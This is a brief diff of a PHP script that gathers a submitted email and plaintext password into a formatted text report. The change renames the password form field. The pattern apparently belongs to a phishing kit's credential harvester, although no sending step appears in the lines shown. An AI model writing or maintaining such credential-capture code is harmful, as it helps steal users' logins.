@@ -41,7 +41,7 @@
     $data = "";
     
     $data = $data."User ID = ".$_POST["email"]."<br>";
-    $data = $data."Password = ".$_POST["password"]."<br>";
+    $data = $data."Password = ".$_POST["pass"]."<br>";
 
     // foreach($_POST as $key=>$value)
     // {
